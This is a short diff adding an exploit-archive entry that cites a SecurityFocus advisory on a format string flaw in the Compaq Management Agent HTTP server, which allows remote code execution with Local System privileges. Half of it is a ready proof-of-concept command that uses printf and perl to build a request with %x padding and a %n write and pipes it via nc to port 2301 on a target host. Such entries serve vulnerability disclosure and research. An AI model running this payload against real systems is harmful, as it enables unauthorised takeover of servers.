@@ -1,0 +1,6 @@
+source: http://www.securityfocus.com/bid/8336/info
+
+The Compaq Management Agent HTTP server is vulnerable to a format string issue. A remote attacker may be able to exploit this vulnerability in order to execute arbitrary code with Local System privileges.
+
+$ printf "GET /<\x21.DebugSearchPaths>?Url=`perl -e 'print "A"x14'`BBBB`perl -e 'print
+".%%x"x1208'`%%n> HTTP/1.0\n\n" | nc 192.168.235.131 2301
